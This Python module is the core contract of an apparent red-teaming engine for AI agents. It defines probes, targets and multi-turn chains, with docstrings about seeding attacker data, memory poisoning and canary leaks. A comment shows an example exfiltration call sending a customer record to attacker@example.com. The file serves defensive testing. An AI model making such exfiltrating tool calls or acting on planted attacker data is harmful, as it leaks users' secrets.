"""
The stable contract every target implements. The engine only ever sees `Probe`,
never a specific bot — that's what makes new targets drop-in.

A target may advertise capabilities so the engine can adapt / degrade gracefully:
  - "tool_visibility": send() can report tool_calls + observations (rich oracle).
                       Black-box HTTP bots omit this -> output-only detectors.
  - "seed": can plant attacker data for indirect-delivery scenarios.
"""
import glob
import io
import os
import re
from dataclasses import dataclass, field
from typing import Optional, List, Tuple


def payload(text):
    """Normalise a payload on its way to a target. Call this at EVERY send site.

    Edge whitespace is not free. Measured on portalagent, mistral-nemo, temperature 0,
    three trials: the identical request scored 0/3 with a trailing newline and 3/3 without
    it — GetProfile(1) versus GetProfile(2), a real authorization boundary decided by one
    invisible character. A YAML block scalar (`text: |`) always appends one, and 110 of the
    225 payloads in this repo's arsenal and objective files are written that way.

    So a run that does not normalise is not measuring the payload its author wrote, and the
    difference is large enough to flip a verdict. It lives here, next to the contract every
    target implements, because a rule that has to be remembered at five call sites will be
    missing from the sixth.
    """
    return (text or "").strip()


def _pair(entry):
    """One tool call as (name, argument), both strings. None when it names no tool.

    Dropped rather than kept as ("", ""): a call nobody can name is not evidence about a tool,
    and a detector counting it would be counting a parse failure as a finding. `targets_http`
    does the dialect-specific version of this — OpenAI nests the name inside `function`,
    Anthropic calls the argument `input` — and this is the floor underneath it, so an adapter
    that builds the list by hand cannot hand a detector something it cannot unpack.
    """
    if entry is None:
        return None
    if isinstance(entry, dict):
        inner = entry.get("function") if isinstance(entry.get("function"), dict) else entry
        name = inner.get("name") or entry.get("tool") or ""
        arg = inner.get("arguments", inner.get("args", inner.get("input", "")))
    elif isinstance(entry, str):
        name, arg = entry, ""
    elif isinstance(entry, (list, tuple)):
        if not entry:
            return None
        name = entry[0]
        rest = [x for x in entry[1:] if x not in (None, "")]
        arg = rest[0] if len(rest) == 1 else (" ".join(str(x) for x in rest) if rest else "")
    else:
        name, arg = entry, ""
    name = "" if name is None else (name if isinstance(name, str) else str(name))
    arg = "" if arg is None else (arg if isinstance(arg, str) else str(arg))
    return (name, arg) if name.strip() else None


@dataclass
class Probe:
    prompt: str
    output: str = ""
    tool_calls: List[Tuple[str, str]] = field(default_factory=list)   # [(tool, input)]
    observations: List[str] = field(default_factory=list)
    error: Optional[str] = None
    seconds: float = 0.0
    # per-turn breakdown of a chain (backward-compatible: empty for single sends).
    # Each entry: {"prompt": str, "output": str, "tool_calls": [...]}. Lets a detector
    # tell WHICH turn misbehaved — e.g. memory-poisoning fires on a benign LATER turn.
    turns: List[dict] = field(default_factory=list)
    # What each tool ACTUALLY received, as opposed to what the model wrote. On a
    # tool-calling agent these are the same thing; on a code agent they are not, and the
    # difference is the whole finding.
    #
    #     send_email(to="attacker@example.com", body=customer_record)
    #
    # That exfiltrated a customer record including an API key, and no detector could see
    # it, because the argument text is a VARIABLE NAME and the secret is bound to it at run
    # time. Pattern matching over source cannot follow data, and tightening the patterns
    # never will. Only the boundary knows what crossed it.
    #
    # So a target may report it: [(tool, resolved_arguments)], recorded by wrapping the
    # tools themselves. This is not an exotic ask of an operator — tool-call logging is
    # standard in every agent-observability setup, so in a real deployment it is something they
    # already have. When it is absent the oracle says so rather than reporting clean; see
    # `oracle.blind_spots`.
    resolved: List[Tuple[str, str]] = field(default_factory=list)
    # HOW MANY EXTRA ATTEMPTS THIS ANSWER TOOK. `runner._resilient_send` retries a send
    # that timed out or errored, and its docstring says why the number matters: `a run
    # that limped is not a clean run and the report reader deserves to know`. It was
    # written to stderr, which is not a channel the reader of an artifact has. A run
    # where every send succeeded first time and one where half of them needed a second
    # attempt produced identical files.
    #
    # On the probe rather than in a counter somewhere, for the reason the error is: the
    # fact belongs to the answer it is about, and every caller of the retry loop —
    # `compose`, `isolation`, `keysearch`, `recon` and the sweep — gets it without
    # asking.
    retries: int = 0
    # HOW LONG THE REPLY REALLY WAS, when the cap kept only the front of it. None means it
    # fit. `targets_http` has attached this since the cap was written, with a sentence
    # saying why -- "the true size travels on the probe so the report can say how much more
    # there was" -- and it attached it with `object.__setattr__`, which is not a field.
    #
    # NOT A FIELD MEANT NOT IN THE ROUND TRIP. `test_rejudge` gates every field of this
    # class against both ends of the artifact -- "a field the writer stops storing comes
    # back from `_probe` as its default in exactly the same way" -- and it derives that set
    # from `dataclasses.fields`, so a value hung on the instance was the one thing the gate
    # could not see. The sweep's serialiser never carried it, `rejudge` never restored it,
    # and the report the comment promises could not say anything: the size reached no file.
    reply_bytes: Optional[int] = None

    def __post_init__(self):
        """The annotations above are a promise; this is what keeps it.

        A dataclass annotation converts nothing. `output: str` was true of exactly one adapter —
        `targets_http` calls `str(reply)` — while the others pass whatever their source handed
        them, and three read it straight out of an application's JSON where a number or a null
        is a perfectly ordinary answer. Fuzzed against every shape a Probe can hold, 55 of the
        63 detectors raise on a non-string `output`, and a detector that raises reports nothing,
        which is indistinguishable from a target that did nothing wrong.

        Coercing here rather than defending in 64 detectors: the assumption belongs to the
        contract, so the contract is where it should be true.

        `None` becomes `""` and not `"None"`. The four characters of that word are evidence
        nobody produced, and a canary detector matching inside it would be reading a bug.
        """
        for _f in ("prompt", "output", "error"):
            _v = getattr(self, _f)
            if _v is None:
                if _f != "error":            # `error=None` means there was no error
                    object.__setattr__(self, _f, "")
            elif isinstance(_v, (bytes, bytearray)):
                # Decoded, not repr'd. `str(b"hi")` is the four characters `b'hi'`, which
                # would put quote marks and a `b` into the evidence a detector reads.
                object.__setattr__(self, _f, bytes(_v).decode("utf-8", "replace"))
            elif not isinstance(_v, str):
                object.__setattr__(self, _f, str(_v))
        for _f in ("tool_calls", "observations", "turns", "resolved"):
            if getattr(self, _f) is None:
                object.__setattr__(self, _f, [])
        # `tool_calls: List[Tuple[str, str]]` is what sixteen detectors unpack, and it was true
        # of one adapter. The rest build the list from their own source, so a bare name, a
        # one-tuple or a None in the list reached detectors that had every right to expect a
        # pair — and an unpacking error is a detector reporting nothing, which reads as clean.
        for _f in ("tool_calls", "resolved"):
            object.__setattr__(self, _f, [_pair(_x) for _x in getattr(self, _f)
                                          if _pair(_x) is not None])
        # `turns` IS NOT NARROWED HERE, and the suite is why. Dropping non-dict entries made
        # every detector safe and broke `capitulation`, which deliberately reads BOTH shapes:
        # one dict per exchange, and a flat alternating list. Removing a supported input to
        # spare two consumers from checking their own is the wrong trade, so the two that
        # called `.get()` on whatever they were handed now check first.
        # Observations are read as text by every detector that touches them.
        object.__setattr__(self, "observations",
                           [_x if isinstance(_x, str) else ("" if _x is None else str(_x))
                            for _x in self.observations])
        try:
            self.seconds = float(self.seconds or 0)
        except (TypeError, ValueError):
            self.seconds = 0.0

    def silent(self):
        """Did anything at all come back? Nothing here is a measurement, whatever it scores.

        AN EMPTY REPLY IS NOT A CLEAN REPLY, and until 2026-08-28 it was counted as one. A
        third-party RAG app answered HTTP 200 with an empty body for fifty consecutive probes
        while the model behind it was down, its adapter recorded no error because there was no
        error, and the baseline reported `48 clean`. Every detector scored silence and found
        nothing, which is exactly what a defended target looks like.

        The sweep has the same shape one door along: a target that returns nothing gets DEFENDED
        on every attack in the arsenal, and a history diff then reports the whole file as fixed.
        `run_redteam` already refused a run where every trial ERRORED, for that precise reason.
        This is the same event arriving without an exception attached, so it belongs to the same
        rule rather than to a second one written next to it.

        Tool calls and turns count as an answer: an agent that called a tool and said nothing
        has told us a great deal.

        A TURN COUNTS WHEN SOMETHING CAME BACK IN IT, not because it exists. This read any
        non-empty `turns` as an answer, so a conversation whose every turn was empty passed as
        heard: walked against an endpoint answering `{"reply": ""}` to everything, the benign
        corpus reported 47 empty and one clean -- the two-turn conversation, with nothing in
        either turn.
        """
        def _heard(t):
            _get = t.get if isinstance(t, dict) else (lambda k, d=None: getattr(t, k, d))
            return bool((_get("output") or "").strip() or _get("tool_calls")
                        or _get("observations"))
        return not ((self.output or "").strip() or self.tool_calls
                    or any(_heard(t) for t in (self.turns or [])) or self.observations)


class Target:
    name = "target"
    capabilities: set = set()

    def send(self, prompt: str) -> Probe:
        raise NotImplementedError

    def reset(self) -> None:
        """Fresh conversation/memory before each probe. Override if stateful."""

    def seed(self, payload: dict) -> None:
        """Plant attacker-controlled data for indirect delivery."""
        raise NotImplementedError(f"target '{self.name}' has no 'seed' capability")

    def unseed(self) -> None:
        """Remove planted data. Always called even if the probe errors."""

    def send_chain(self, prompts: list) -> Probe:
        """Multi-turn attack: run prompts in sequence with PERSISTENT memory,
        returning one Probe whose tool_calls/observations aggregate the whole
        conversation. Requires the 'chain' capability."""
        raise NotImplementedError(f"target '{self.name}' has no 'chain' capability")


def package_version():
    """The version, whether this is an installed package or a file being run by path.

    `from . import __version__` is the right way and it raises when there is no package
    context, which is exactly how this file is run during development and in the offline
    suites. Falling back to reading the constant out of its own source keeps `--version`
    working in both, and keeps ONE definition of the number: the alternative is a copy in this
    file that agrees with `__init__.py` until somebody bumps one of them.

    It lives here rather than in `cli.py` because `engine_version()` below needs it too, and
    the same rule written in two modules is the defect this project keeps finding elsewhere.
    """
    try:
        from . import __version__
        return __version__
    except ImportError:
        pass
    here = os.path.dirname(os.path.abspath(__file__))
    src = io.open(os.path.join(here, "__init__.py"), encoding="utf-8").read()
    found = re.search(r'^__version__\s*=\s*"([^"]+)"', src, re.M)
    return found.group(1) if found else "unknown"


def judged_now(meta):
    """-> `meta` with the build stamped as the one that produced the verdicts in it.

    `write_maps` says the rule and applies it: "The BUILD is the opposite case and is
    stamped unconditionally: it describes the oracle that produced the verdicts in this
    file, which is always the one running now." It is written beside `when`, which is the
    opposite -- the probes were measured whenever they were measured, and a re-score must
    not stamp today onto them.

    THE RULE WAS STATED FOR LOCK MAPS AND APPLIED TO NOTHING ELSE. `rejudge --write`
    rewrites three artifact families in one command: a lock map, which re-stamps; a results
    file, which kept the old build beside verdicts the current oracle had just produced;
    and `benign --rejudge --write` the same. Three readers act on that field --
    `history.diff` raises `engine A -> B: the oracle that judged these two runs is not the
    same one`, `model_matrix --from-disk` warns about different builds, and
    `detector_coverage`'s provenance audit files artifacts by it -- so a re-scored artifact
    told all three that an older oracle had judged it.
    """
    return {**(meta or {}), "engine": engine_version()}


def engine_version():
    """Which build of this engine produced an artifact. Cheap, cached, never fatal.

    A stored result is read as a statement about the current engine, and it is not: it is a
    statement about the engine that WROTE it. `tool_call_storm` held a place in the published
    "demonstrated" count on one probe holding eleven tool calls, and the eleven were each
    concrete call recorded twice — written by the adapter version that kept boundary records
    and raw calls in one list, before that was split into `probe.resolved`. Fixing the adapter
    did not fix the file it had already written: that stayed on disk and went on propping up
    the headline, because nothing about it said which engine it came from.

    So every result carries the commit that produced it, and a reader can say "this evidence
    predates the fix" instead of discovering it by hand a day later. Best-effort on purpose:
    a missing git, a tarball with no history, a detached checkout, none of those is a reason
    to fail a run. Where git cannot answer the installed release can, and it is stamped
    instead; "unknown" is what is left when neither can be read.
    """
    global _ENGINE_VERSION
    if _ENGINE_VERSION is not None:
        return _ENGINE_VERSION
    _ENGINE_VERSION = "unknown"
    try:
        import subprocess
        here = os.path.dirname(os.path.abspath(__file__))
        rev = subprocess.run(["git", "rev-parse", "--short", "HEAD"], cwd=here,
                             capture_output=True, text=True, timeout=5)
        if rev.returncode == 0 and rev.stdout.strip():
            _ENGINE_VERSION = rev.stdout.strip()
            dirty = subprocess.run(["git", "status", "--porcelain", "--", "."], cwd=here,
                                   capture_output=True, text=True, timeout=5)
            # An uncommitted engine is not the commit it claims to be, and a result written
            # from one is not reproducible from that hash. Say so rather than round down.
            if dirty.returncode == 0 and dirty.stdout.strip():
                _ENGINE_VERSION += "+dirty"
    except Exception:
        pass
    if _ENGINE_VERSION == "unknown":
        # AN INSTALLED COPY HAS NO REPOSITORY TO ASK, and that is every copy except this one.
        # "unknown" was truthful and useless: the field exists so a reader can say "this
        # evidence predates the fix", and it said nothing on every artifact a user of this
        # tool was ever going to write. The release is knowable right here, one file away, so
        # an install stamps "0.4.0" where a checkout stamps a commit. The two are told apart
        # by shape, and "unknown" is left for the case where neither can be read at all.
        try:
            _pv = (package_version() or "").strip()
            if _pv and _pv.lower() != "unknown":
                _ENGINE_VERSION = _pv
        except Exception:
            pass
    return _ENGINE_VERSION


_ENGINE_VERSION = None


def chain_probe(prompts, step):
    """One conversation, turn by turn: `step(prompt) -> Probe` sends one turn, and this is the
    ONE place that decides what the conversation's probe holds.

    SEVEN COPIES OF THIS RULE, AND THEY DISAGREED. Five tool agents returned no `turns` at all,
    so a canary one turn leaked and the next refused was judged on the last reply alone --
    DEFENDED -- and `memory_poison` and `capitulation`, which need the turns, could never
    fire on them. rangebot ignored a turn's error and kept going, so a dropped connection was
    scored as a measured trial. httpbot returned the bare error and threw away the turns that
    had answered, the defect `targets_http` had just been fixed for. Three adapters' turns
    carried no `seconds`, so `slow_response` judged the conversation's total. And the prompt
    was joined three different ways. Found by an independent review.

    So: every turn is recorded with what it sent, what came back, its tool calls, what the
    tools returned and its own time; the conversation stops at the turn that errored and
    keeps the turns that answered beside the error; the attacker's side is every prompt,
    one per line, the form `runner.attacker_side` reconstructs.
    """
    import time as _t
    turns, out, calls, obs, res, secs = [], "", [], [], [], 0.0
    for p in prompts:
        t0 = _t.time()
        pr = step(p)
        s = float(getattr(pr, "seconds", 0) or 0) or round(_t.time() - t0, 3)
        if getattr(pr, "error", None):
            return Probe(prompt="\n".join(prompts), output=out, tool_calls=calls,
                         observations=obs, resolved=res, turns=turns, seconds=secs + s,
                         error=pr.error)
        out = pr.output
        calls += list(pr.tool_calls or [])
        obs += list(pr.observations or [])
        res += list(getattr(pr, "resolved", None) or [])
        secs += s
        turns.append({"prompt": p, "output": pr.output,
                      "tool_calls": list(pr.tool_calls or []),
                      "observations": list(pr.observations or []), "seconds": s})
    return Probe(prompt="\n".join(prompts), output=out, tool_calls=calls, observations=obs,
                 resolved=res, turns=turns, seconds=secs)


def executor_turn(ex, prompt):
    """One turn through a LangChain agent executor, as a Probe. The four practice agents
    built on one carried this body four times, inside their chain loops."""
    import contextlib as _cl
    import time as _t
    t0 = _t.time()
    with _cl.redirect_stdout(io.StringIO()), _cl.redirect_stderr(io.StringIO()):
        try:
            r = ex.invoke({"input": prompt})
        except Exception as e:
            return Probe(prompt=prompt, output="", error=f"{type(e).__name__}: {e}",
                         seconds=round(_t.time() - t0, 1))
    steps = r.get("intermediate_steps", []) or []
    return Probe(prompt=prompt, output=r.get("output", "") or "",
                 tool_calls=[(a.tool, str(a.tool_input)) for a, _ in steps],
                 observations=[str(o) for _, o in steps], seconds=round(_t.time() - t0, 1))


def target_configs(directory=None):
    """Every real target config in a directory, sorted, temporaries excluded.

    ONE enumeration because there were eleven, and only one of them excluded the temporary
    configs the end-to-end suites write beside the real ones. The others' answers changed
    depending on whether a suite was running: a gate counted two extra oracle contexts and
    reported it as a documentation drift, and a full sweep would have run against a config
    that exists only to be unreachable.

    The suffix is the same one `build_generic.py` excludes for the arsenal, and it is the
    reason `test_end_to_end.py` puts its process id BEFORE `_tmp` rather than after.
    """
    directory = directory or os.path.dirname(os.path.abspath(__file__))
    found = sorted(p for p in glob.glob(os.path.join(directory, "targets_*.yaml"))
                   if not os.path.basename(p).endswith(("_tmp.yaml", ".tmp.yaml")))

    # AND THE ONES THAT DO NOT LIVE HERE, which is every config `qatration init` writes. This
    # enumeration is what `rejudge`, `coverage` and the report builders use to find the oracle
    # context for a set of results -- the canaries and markers that decide whether a stored
    # reply is a leak. Looking only in this directory meant that for anybody who is not this
    # repository, rejudge re-scored nothing and coverage scanned with an empty context, with
    # every canary detector inert. Both said so; neither could be pointed anywhere.
    #
    # Fixed here rather than as a flag per command, because a flag per command is a flag the
    # next command arrives without. Same shape as QATRATION_OUT: paths, separated by the
    # platform's path separator.
    #
    # A named path is used as named. The `_tmp` exclusion above exists because the end-to-end
    # suites write throwaway configs into THIS directory; somebody who spells out a path means
    # the file they spelled out.
    extra = os.environ.get("QATRATION_CONFIGS", "")
    for p in extra.split(os.pathsep):
        p = p.strip()
        if p and p not in found:
            if not os.path.isfile(p):
                raise SystemExit(f"QATRATION_CONFIGS names {p!r}, which is not a file. "
                                 f"Nothing was read, rather than reading less than asked.")
            found.append(p)
    return found
